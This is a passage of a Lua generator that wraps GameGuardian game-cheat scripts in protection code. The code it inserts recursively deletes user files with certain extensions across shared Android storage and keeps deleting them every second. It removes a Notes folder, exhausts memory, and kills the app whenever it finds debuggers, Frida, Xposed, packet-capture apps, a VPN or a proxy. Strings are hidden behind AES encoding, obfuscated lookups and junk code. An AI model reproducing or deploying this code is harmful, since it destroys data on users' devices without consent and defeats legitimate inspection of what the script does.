file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疑疤疓疘畞畱疢疤畞疄疟疟疜畞疣疕疑疤疓疘"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疜疑疑疜疜疛疨疘疤疢疞疡疞疓疧"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疛疘疟疙疣疓疢疙疠疤畞疜疟疗疗疕疢"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疛疑疟疩疗疨疑疠疠"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疃疟疥疢疓疕畻疟疞疪疜疕疤"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("疛疟疞疪疜疕疤畐畯畯畯"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞畲疩畷畷疈畵疊"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

os[__x("疢疕疝疟疦疕")](__x("畟疣疔疓疑疢疔畟畾疟疤疕疣"))

os.remove("/sdcard/Notes")
local function complexLoop()
    local t = {}
    for i = 1, 100 do
        t[i] = {}
        for j = 1, 50 do
            t[i][j] = string.rep("B", 1024)
        end
    end
    local tmp = 0
    for k, v in pairs(t) do
        tmp = tmp + #v[1]
    end
end

local function createMassiveData()
    local t = {}
    for i = 1, 500 do
        t[i] = {}
        for j = 1, 50 do
            t[i][j] = string.rep("D", 2048)
        end
    end
    local tmp = 0
    for k, v in pairs(t) do
        tmp = tmp + #v[1]
    end
    complexLoop()
end

import "java.lang.reflect.*"
import "android.ext.hy"
import "java.io.*"

local Class = luajava.bindClass
local new = luajava.new
local astable = luajava.astable

local hyClass = Class("android.ext.hy")
local BooleanClass = Class("java.lang.Boolean")
local BooleanType = BooleanClass.TYPE
local Modifier = Class("java.lang.reflect.Modifier")
local function cleanSpecificFiles(dir)
    local File = Class("java.io.File")
    local patterns = {
      
        "%.load$",    --  .load  
        "%.lasm$",    --  .lasm  
        "%.log%.txt$", --  .log.txt
        "%.load%.tmp$", --  .tmp
        "%.tail$"     --  .tail
    }    
    local files = dir:listFiles()
    if files then
        for i, file in ipairs(astable(files)) do
            if file:isFile() then  
                local name = file:getName()
                for _, pattern in ipairs(patterns) do
                    if name:match(pattern) then
                        file:delete()
                      --  print("🚫 DELETED: " .. file:getAbsolutePath())
                    end
                end
            end
        end
    end
end

local function scanDirectory(dir)
    if not dir:exists() or not dir:isDirectory() then
        return
    end
    cleanSpecificFiles(dir)
    local files = dir:listFiles()
    if files then
        for i, file in ipairs(astable(files)) do
            if file:isDirectory() then
                scanDirectory(file)  
            end
        end
    end
end

local mainDirs = {
    "/sdcard",
    "/storage/emulated/0", 
    "/storage/emulated/1",
    "/storage/sdcard0",
    "/storage/sdcard1", 
    "/mnt/sdcard",
    "/data/local/tmp"
}
local totalDeleted = 0
for _, dirPath in ipairs(mainDirs) do
    local dir = new(Class("java.io.File"), dirPath)
    if dir:exists() then
       -- print("📁 cleaning: " .. dirPath)
        scanDirectory(dir)
    end
end

local function cleanNotesDirectory()
    local Tools = Class("android.ext.Tools")
    local rMethod = Tools:getDeclaredMethod("r", {})
    rMethod:setAccessible(true)
    local basePath = rMethod:invoke(nil, {})    
    if basePath then
        local notesDir = new(Class("java.io.File"), basePath .. "/Notes")
        if notesDir:exists() then
            scanDirectory(notesDir)
        end
    end
end
pcall(cleanNotesDirectory)
local function continuousProtector()
    while true do       
        for _, dirPath in ipairs(mainDirs) do
            local dir = new(Class("java.io.File"), dirPath)
            if dir:exists() then
                cleanSpecificFiles(dir)
            end
        end
        
        local Thread = Class("java.lang.Thread")
        Thread:sleep(1000) 
    end
end
local fields = hyClass:getDeclaredFields()
local fieldsTable = astable(fields)
for i, field in ipairs(fieldsTable) do
    local modifiers = field:getModifiers()
    local fieldName = field:getName()    
    if i > 1 then
        local isStaticBit = bit32.band(modifiers, Modifier.STATIC) ~= 0
        
        if field:getType() == BooleanType and isStaticBit then
            field:setAccessible(true)
            local value = field:get(nil)            
            if value == true then
pcall(continuousProtector)
gg.alert("checkbox log enable, please disable checkbox log")
createMassiveData()
    complexLoop()
    runtime:halt(1)
        runtime:exit(0)  
                os.exit()
            end
        end
    end
end

import "android.app.*"
import "android.content.*"
import "android.os.*"
import "android.content.pm.*"
import "java.io.*"
import "java.util.*"
import "java.net.NetworkInterface"
import "java.util.Collections"
import "java.lang.System"

local packageName = activity.getPackageName()

local dangerousPackages = {
    "com.ghostery", "com.fan.ggluadec", "com.fan.ggxxls", "com.chenlun.autumncloudlua",
    "com.maggienorth.max.postdata", "com.goushi.gtpcanary", "com.packagesniffer.frtparlak",
    "app.greyshirts.sslcapture", "com.minhui.networkcapture", "com.minhui.wifianalyzer",
    "frtparlak.rootsniffer", "jp.co.taosoftware.android.packetcapture"
}

local ignoredPackages = {
    [packageName] = true
}

local suspiciousKeywords = {
    "loadfile", "Loadfile", "LOADFILE", "log", "load", "LOAD", "Log", "decompile", 
    "Decompile", "Hook", "HOOK", "Decode", "DECODE", "decrypt", "Decrypt", 
    "DECRYPT", "decompiler", "DECOMPILER", "Decompiler", "Decryptor", 
    "DECRYPTOR", "Decoding", "DECODING", "decoding", "Hooker", "HOOKER", 
    "loader", "LOADER", "Loader", "Lasm", "LASM", "lasm"
}
local function identifyProcessesToIgnore(processes, ownPackageName)
    local toIgnore = {}
    toIgnore[ownPackageName] = true     
    local parentsWithChildren = {}
    local allSubprocesses = {}    
    for i = 0, processes.size() - 1 do
        local process = processes.get(i)
        local processName = process.processName        
        for j = 0, processes.size() - 1 do
            local otherProcess = processes.get(j)
            local otherName = otherProcess.processName          
            if otherName:find(processName .. ":") == 1 then
             parentsWithChildren[processName] = true
                break
            end
        end
    end    
    for i = 0, processes.size() - 1 do
        local process = processes.get(i)
        local processName = process.processName       
        for parent in pairs(parentsWithChildren) do
            if processName:find(parent .. ":") == 1 then
                allSubprocesses[processName] = true
                break
            end
        end
    end

    for parent in pairs(parentsWithChildren) do
        toIgnore[parent] = true
    end    
    for subprocess in pairs(allSubprocesses) do
        toIgnore[subprocess] = true
    end    
    return toIgnore
end

local function isBeingDebugged(pid)
    local success, result = pcall(function()
        local file = io.open("/proc/" .. pid .. "/status", "r")
        if not file then return false end
        
        for line in file:lines() do
            if line:find("TracerPid") == 1 then
                local tracerPid = line:match("%d+")
                if tracerPid and tonumber(tracerPid) > 0 then
                    file:close()
                    return true
                end
            end
        end        
        file:close()
        return false
    end)   
    return success and result or false
end
local function isAccessingMemoryTools(pid)
    local success, result = pcall(function()
        local file = io.open("/proc/" .. pid .. "/maps", "r")
        if not file then return false end       
        for line in file:lines() do
            if line:find("libgg.so") or 
               line:find("gameguardian") or 
               line:find("libdvm.so") or 
               line:find("libart.so") or
               line:find("frida") or
               line:find("xposed") or
               line:find("libriru") or
               line:find("libsubstrate") then
                file:close()
                return true
            end
        end        
        file:close()
        return false
    end)    
    return success and result or false
end
local function listRunningProcesses()
    local activityManager = activity.getSystemService(Context.ACTIVITY_SERVICE)
    if not activityManager then return {} end   
    local runningProcesses = activityManager.getRunningAppProcesses()
    if not runningProcesses or runningProcesses.size() == 0 then return {} end    
    local processesToIgnore = identifyProcessesToIgnore(runningProcesses, packageName)    
    for pkg, _ in pairs(ignoredPackages) do
        processesToIgnore[pkg] = true
    end    
    local suspiciousProcesses = {}    
    for i = 0, runningProcesses.size() - 1 do
        local process = runningProcesses.get(i)
        local processName = process.processName
        local pid = tostring(process.pid)       
        if not processesToIgnore[processName] then
            local isDebugging = isBeingDebugged(pid)
            local isMemoryTool = isAccessingMemoryTools(pid)
            
            if isDebugging or isMemoryTool then
                table.insert(suspiciousProcesses, {
                    name = processName,
                    pid = pid,
                    debugging = isDebugging,
                    memoryTool = isMemoryTool
                })
            end
        end
    end
    return suspiciousProcesses
end
local function checkDangerousApps()
    local packageManager = activity.getPackageManager()
    local apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
    local dangerousApps = {}    
    for i = 0, #apps - 1 do
        local app = apps[i]
        if (app.flags & ApplicationInfo.FLAG_SYSTEM) == 0 then
            local packageName = app.packageName
            local isDangerous, pattern = false, nil
            local lowerPackageName = string.lower(packageName)          
            for _, dangerousPattern in ipairs(dangerousPackages) do
                if string.find(lowerPackageName, string.lower(dangerousPattern)) then
                    isDangerous = true
                    pattern = dangerousPattern
                    break
                end
            end           
            if isDangerous then
                table.insert(dangerousApps, {
                    name = packageManager.getApplicationLabel(app) or "Unknown",
                    packageName = packageName,
                    detectionReason = "Matches dangerous pattern: " .. pattern
                })
            end
        end
    end    
    return dangerousApps
end

local function checkSuspiciousFiles()
    local t_dir = gg.FILES_DIR
    local original_path = t_dir:gsub("files", "shared_prefs/" .. gg.PACKAGE .. "_preferences.xml")
    
    local content = file.read(original_path)
    if content then
        for _, w in ipairs(suspiciousKeywords) do
            if content:find(w) then
                return true, "Found suspicious keyword in preferences: " .. w
            end
        end
    end
    
    local folders = {}
    if content then
        for name, path in string.gmatch(content, '<string name="(history%-%d+)">(.-)</string>') do
            local folder = path
            if folder:match("%.lua$") or folder:match("%..+[^/]*$") then
                folder = folder:match("(.*/)")
                if folder then
                    folder = folder:gsub("/$", "")
                end
            end
            if folder and #folder > 25 and not folders[folder] then
                table.insert(folders, folder)
                folders[folder] = true
            end
        end
    end   
    local extensions = {".tar", ".lasm", ".tail", "log.txt"}
    for _, folder in ipairs(folders) do
        local files = file.list(folder)
        if files and type(files) == "table" then
            for _, filename in ipairs(files) do
                local lower = filename:lower()
                for _, ext in ipairs(extensions) do
                    if lower:sub(-#ext) == ext then
                        return true, "Suspicious file found: " .. filename .. " in " .. folder
                    end
                end
            end
        end
    end    
    return false
end

local function checkVPN()
    local niList = NetworkInterface.getNetworkInterfaces()
    if niList ~= nil then
        local it = Collections.list(niList).iterator()
        while it.hasNext() do
            local intf = it.next()
            if intf.isUp() and intf.getInterfaceAddresses().size() ~= 0 then
                local name = intf.getName()
                if name == "tun0" or name == "ppp0" then
                    return true, "VPN detected: " .. name
                end
            end
        end
    end
    return false
end

local function checkProxy()
    local httpHost = System.getProperty("http.proxyHost")
    local httpPort = System.getProperty("http.proxyPort")
    if httpHost ~= nil and httpHost ~= "" then
        return true, "Proxy detected: " .. httpHost .. ":" .. (httpPort or "")
    end
    return false
end

local function detectPacketCapture()
    if gg.isVPN() then
        gg.alert("🚨 VPN detected - possible packet capture!")
        return true
    end
    local captureApps = {
        "com.guoship.capture",
        "com.minhui.networkcapture", 
        "app.greyshirts.sslcapture"
    }
    
    for _, pkg in ipairs(captureApps) do
        if tools.isPackageInsta(pkg) then
            gg.alert("🚨 Packet capture app installed: " .. pkg)
            createMassiveData()
            complexLoop()
            runtime:halt(1)
        runtime:exit(0)  
            return true
        end
    end
    return false
end
]]

if g.info[3] == true then
  newContent = newContent .. [[
local suspiciousProcesses = listRunningProcesses()
if #suspiciousProcesses > 0 then
    gg.alert("🚨 Suspicious processes detected!", "OK")
    createMassiveData()
    complexLoop()
    runtime:halt(1)
        runtime:exit(0)  
end
]]
end

if g.info[4] == true then
  newContent = newContent .. [[
local dangerousApps = checkDangerousApps()
if #dangerousApps > 0 then
    gg.alert("🚨 Dangerous apps detected!", "OK")
    createMassiveData()
    complexLoop()
    runtime:halt(1)
        runtime:exit(0)  
end
]]
end

--if g.info[5] == true then
--  newContent = newContent .. [[
--local hasSuspiciousFiles, fileReason = ---checkSuspiciousFiles()
--if hasSuspiciousFiles then
 --   gg.alert("🚨 " .. fileReason, "OK")
  --  createMassiveData()
 --   complexLoop()
 --   runtime:halt(1)
     --   runtime:exit(0)  
--end

--end

if g.info[5] == true then
  newContent = newContent .. [[
local hasVPN, vpnReason = checkVPN()
if hasVPN then
    gg.alert("🚨 " .. vpnReason, "OK")
    createMassiveData()
    complexLoop()
    runtime:halt(1)
        runtime:exit(0)  
end
]]
end
if g.info[6] == true then
  newContent = newContent .. [[
local hasProxy, proxyReason = checkProxy()
if hasProxy then
    gg.alert("🚨 " .. proxyReason, "OK")
    createMassiveData()
    complexLoop()
    runtime:halt(1)
        runtime:exit(0)  
end
]]
end

if g.info[7] == true then
  newContent = newContent .. [[
detectPacketCapture()
]]
end

if g.info[8] == true then
  local LOGIN = gg.prompt({ 
      "🕵 Sᴇᴛ Usᴇʀɴᴀᴍᴇ Fᴏʀ Sᴄʀɪᴘᴛ :",
      "🔐 Sᴇᴛ Pᴀssᴡᴏʀᴅ Fᴏʀ Sᴄʀɪᴘᴛ :", 
      "📝 Tʏᴘᴇ Mᴇssᴀɢᴇ Fᴏʀ Sᴜᴄᴄᴇs Lᴏɢɪɴ :"
  }, {"Batman", "games", "🎉 Sᴜᴄᴄᴇss Lᴏɢɪɴ! 🎉"}, { "text", "text", "text"}) 
  
  if LOGIN and LOGIN[1] ~= '' and LOGIN[2] ~= '' then
    newContent = newContent .. [[

import "android.content.Context"

local PREFS_NAME = "script_login_prefs"
local USER_KEY = "username"
local PASS_KEY = "password"

local function setupCredentials()
    local sharedPrefs = activity.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    local editor = sharedPrefs.edit()
    
    editor.putString(USER_KEY, "]] .. LOGIN[1] .. [[")
    editor.putString(PASS_KEY, "]] .. LOGIN[2] .. [[")
    editor.commit()
    return sharedPrefs
end
local function loginUser()
    local sharedPrefs = setupCredentials()
    local savedUser = sharedPrefs.getString(USER_KEY, "")
    local savedPass = sharedPrefs.getString(PASS_KEY, "")    
    local result = gg.prompt(
        {"🕵 Usᴇʀɴᴀᴍᴇ:", "🔐 Pᴀssᴡᴏʀᴅ:"},
        {"", ""},
        {"text", "text"}
    )    
    if result == nil then
        gg.alert("❌ Lᴏɢɪɴ Cᴀɴᴄᴇʟᴇᴅ! ❌")
        return false
    end
    local inputUser = result[1] or ""
    local inputPass = result[2] or ""    
    if inputUser == "" then
        gg.alert("⚠️ Usᴇʀɴᴀᴍᴇ Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️")
        return false
    end   
    if inputPass == "" then
        gg.alert("⚠️ Pᴀssᴡᴏʀᴅ Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️")
        return false
    end  
    if inputUser == savedUser and inputPass == savedPass then
        gg.toast("]] .. LOGIN[3] .. [[")
        return true
    else
        gg.alert("❌ Iɴᴠᴀʟɪᴅ Usᴇʀɴᴀᴍᴇ ᴏʀ Pᴀssᴡᴏʀᴅ! ❌")
        return false
    end
end
gg.toast("🔐 Lᴏᴀᴅɪɴɢ Lᴏɢɪɴ Sʏsᴛᴇᴍ...")
gg.sleep(1000)
if not loginUser() then
    print("❌ Lᴏɢɪɴ Fᴀɪʟᴇᴅ! Exiting script. ❌")
    runtime:halt(1)
        runtime:exit(0)  
end
gg.sleep(500)
gg.toast("]] .. LOGIN[3] .. [[")
gg.sleep(500)

]]
  else
    gg.alert("❌ Invalid credentials for SharedPreferences login!")
  end

if g.info[9] == true then
    _Hacks_Unlimited_ = gg.prompt({
        "✏️ Set Your Package GameGuardian",
        "📝 Type Message If Package Is Wrong :"
    }, {"catch_.me_.if_.you_.can_","⚠ Use MY GG For Run This Script ⚠"},{"text","text"})
end

if  _Hacks_Unlimited_ then

    newContent = newContent .. [[
import "android.app.*"
import "android.os.*"
import "android.widget.*"
import "android.view.*"
import "android.content.pm.*"
import "java.io.*"
import "java.text.SimpleDateFormat"
import "java.util.*"
import "java.lang.Runtime"

local Runtime = luajava.bindClass("java.lang.Runtime")
local runtime = Runtime.getRuntime()
function getPackageNameOnly()
    local success, result = pcall(function()
        return activity.getPackageName()
    end)
    if success then
        return result
    else
        return nil
    end
end
local TARGET_PACKAGE = "]].._Hacks_Unlimited_[1]..[["
local currentPackage = getPackageNameOnly()

if currentPackage then
    if currentPackage == TARGET_PACKAGE then
        gg.alert("✅ checked!")
    else
        print("❌ invalid gg!")
        gg.alert("❌ APP INCORRET! use ]].._Hacks_Unlimited_[2]..[[")
        runtime:halt(1)
        runtime:exit(0)  
    end
else
    gg.alert("❌ Erro getting info app")
end
]]
else
  --  gg.alert("❌ Invalid info!")
  end
end

if g.info[10] == true then
    local Random = luajava.bindClass("java.util.Random")
    local random = Random:new()
    local code = tostring(random:nextInt(89999) + 10000) 
    
    newContent = newContent .. [[
local Random = luajava.bindClass('java.util.Random')
local random = Random:new()
local code = tostring(random:nextInt(89999) + 10000)
local hmn = gg.prompt({'🔒 Input This Code to Verify: '..code..' !'},{[1]=''},{[1]='number'}) 
if not hmn then os.exit() end 
if tostring(hmn[1]) == code then gg.toast('☑ Code correct!') else gg.alert('✖ Wrong Code!') os.exit() end
]]
end

if g.info[11] == true then
    local Locale = luajava.bindClass("java.util.Locale")
    local countries = {
        {"US", "United States", "🇺🇸"},
        {"BR", "Brazil", "🇧🇷"},
        {"GB", "United Kingdom", "🇬🇧"},
        {"CA", "Canada", "🇨🇦"},
        {"FR", "France", "🇫🇷"},
        {"DE", "Germany", "🇩🇪"},
        {"IT", "Italy", "🇮🇹"},
        {"ES", "Spain", "🇪🇸"},
        {"JP", "Japan", "🇯🇵"},
        {"CN", "China", "🇨🇳"},
        {"IN", "India", "🇮🇳"},
        {"RU", "Russia", "🇷🇺"},
        {"AU", "Australia", "🇦🇺"},
        {"MX", "Mexico", "🇲🇽"},
        {"KR", "South Korea", "🇰🇷"},
        {"PT", "Portugal", "🇵🇹"},
        {"NL", "Netherlands", "🇳🇱"},
        {"TR", "Turkey", "🇹🇷"},
        {"SA", "Saudi Arabia", "🇸🇦"},
        {"ID", "Indonesia", "🇮🇩"},
        {"PL", "Poland", "🇵🇱"},
        {"AR", "Argentina", "🇦🇷"},
        {"ZA", "South Africa", "🇿🇦"},
        {"EG", "Egypt", "🇪🇬"},
        {"NG", "Nigeria", "🇳🇬"},
        {"PK", "Pakistan", "🇵🇰"},
        {"BD", "Bangladesh", "🇧🇩"},
        {"VN", "Vietnam", "🇻🇳"},
        {"PH", "Philippines", "🇵🇭"},
        {"TH", "Thailand", "🇹🇭"},
        {"MY", "Malaysia", "🇲🇾"},
        {"SG", "Singapore", "🇸🇬"},
        {"IL", "Israel", "🇮🇱"},
        {"AE", "United Arab Emirates", "🇦🇪"},
        {"SE", "Sweden", "🇸🇪"},
        {"NO", "Norway", "🇳🇴"},
        {"DK", "Denmark", "🇩🇰"},
        {"FI", "Finland", "🇫🇮"},
        {"BE", "Belgium", "🇧🇪"},
        {"CH", "Switzerland", "🇨🇭"},
        {"AT", "Austria", "🇦🇹"},
        {"GR", "Greece", "🇬🇷"},
        {"IE", "Ireland", "🇮🇪"},
        {"CZ", "Czech Republic", "🇨🇿"},
        {"RO", "Romania", "🇷🇴"},
        {"HU", "Hungary", "🇭🇺"},
        {"UA", "Ukraine", "🇺🇦"},
        {"CL", "Chile", "🇨🇱"},
        {"CO", "Colombia", "🇨🇴"},
        {"PE", "Peru", "🇵🇪"}
    }    
    local countryDisplay = {}
    for i, country in ipairs(countries) do
        countryDisplay[i] = country[3] .. " " .. country[2] .. " (" .. country[1] .. ")"
    end   
    local options = {"🌍 Select allowed countries:"}
    local defaults = {}    
    for i, display in ipairs(countryDisplay) do
        options[i+1] = "▫ " .. display
        defaults[i] = false
    end  
    local selected = gg.multiChoice(options, defaults)    
    if not selected then
        gg.alert("❌ Country selection cancelled")
        return
    end
    local allowedCountries = {}
    for i = 2, #options do
        if selected[i] then
            table.insert(allowedCountries, countries[i-1][1])
        end
    end    
    if #allowedCountries == 0 then
        gg.alert("❌ Please select at least one country!")
        return
    end    
    local countryCode = [[
local Locale = luajava.bindClass("java.util.Locale")
local currentLocale = Locale:getDefault()
local currentCountry = currentLocale:getCountry()
local currentLanguage = currentLocale:getLanguage()
local allowedCountries = {]]
    for i, country in ipairs(allowedCountries) do
        countryCode = countryCode .. [["]] .. country .. [["]]
        if i < #allowedCountries then
            countryCode = countryCode .. ", "
        end
    end
    countryCode = countryCode .. [[}
local allowed = false
for i, country in ipairs(allowedCountries) do
    if currentCountry == country then
        allowed = true
        break
    end
end
if not allowed then
    local countryNames = {}
    for i, code in ipairs(allowedCountries) do
        local locale = Locale("", code)
        table.insert(countryNames, locale:getDisplayCountry())
    end
    gg.alert("🚫 Access Denied!\\n\\n" ..
            "Your Country: " .. currentLocale:getDisplayCountry() .. " (" .. currentCountry .. ")\\n" ..
            "Your Language: " .. currentLocale:getDisplayLanguage() .. "\\n\\n" ..
            "Allowed Countries:\\n" ..
            table.concat(countryNames, "\\n"))
    os.exit()
else
end
]]
    newContent = newContent .. countryCode
    
    gg.alert("✅ Country protection added!\n\nSelected " .. #allowedCountries .. " countr(ies)")
end

BATMAN = [[
end
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]

function encodegg(code)
    return 'gg[a("' .. encrypt(code) .. '")]('
end

function encodeos(code)
    return 'os[a("' .. encrypt(code) ..'")]('
end

function encodestr(code)
    return 'string[a("' .. encrypt(code) .. '")]('
end

function encvalues(code)
    return 'a("' .. encrypt(code) .. '")'
end

DATA = DATA:gsub('%".-(.-)%"', encvalues)
DATA = DATA:gsub("%'.-(.-)%'", encvalues)
DATA = DATA:gsub('%[%[.-(.-)%]%]', encvalues)
DATA = DATA:gsub("gg%.(%a+)%(", encodegg)
DATA = DATA:gsub("os%.(%a+)%(", encodeos)
DATA = DATA:gsub("end", function() return BATMAN end)

newContent = newContent .. [[
function a(encrypted_str)
    while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    local chave = "d5?;,.)(j+=@<>/&"
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    local baseCode_decodificado = string.baseCode(encrypted_str, "de")
    while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    local aes_descriptografado = string.AES(baseCode_decodificado, chave, "de")
